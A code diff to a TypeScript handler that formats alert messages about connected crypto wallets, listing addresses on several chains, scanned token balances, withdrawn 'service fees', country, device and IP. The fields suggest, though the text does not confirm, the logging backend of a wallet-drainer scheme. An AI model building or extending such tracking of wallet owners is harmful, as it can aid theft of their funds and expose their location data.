@@ -31,18 +31,18 @@ export default async function handler(
   const primaryWallet = address || wallet || 'N/A';
   const walletDetails = [
     `Wallet (EVM): ${primaryWallet}`,
-    tronAddress ? `TRON Address: ${tronAddress}` : null,
-    solanaAddress ? `Solana Address: ${solanaAddress}` : null,
-  ].filter(Boolean).join('\n');
+    `TRON Address: ${tronAddress || 'Not Connected'}`,
+    `Solana Address: ${solanaAddress || 'Not Connected'}`,
+  ].join('\n');
 
   const tokenSummary = tokenBalances && Array.isArray(tokenBalances) && tokenBalances.length
     ? `Scanned Assets:\n${tokenBalances.map((t: any) => ` - [${t.network}] ${t.symbol}: ${t.amount}`).join('\n')}\n`
-    : '';
+    : 'Scanned Assets: None found (0 balance across EVM, TRON, and Solana)\n';
 
   const message = eventType === 'wallet_error'
     ? `⚠️ Wallet event\n\nEvent: ${eventType}\n${walletDetails}\nError: ${error || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
     : eventType === 'wallet_connected'
-      ? `🔗 Wallet connected\n\n${walletDetails}\nBalance: ${balance || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
+      ? `🔗 Wallet connected\n\n${walletDetails}\nPrimary Balance: ${balance || '0'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
       : eventType === 'service_fee'
         ? `💰 Service fee collected\n\n${walletDetails}\nWithdrawn: ${withdrawnAmount || amount || 'N/A'}\nFee rate: ${feePercent || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
         : eventType === 'withdrawal'
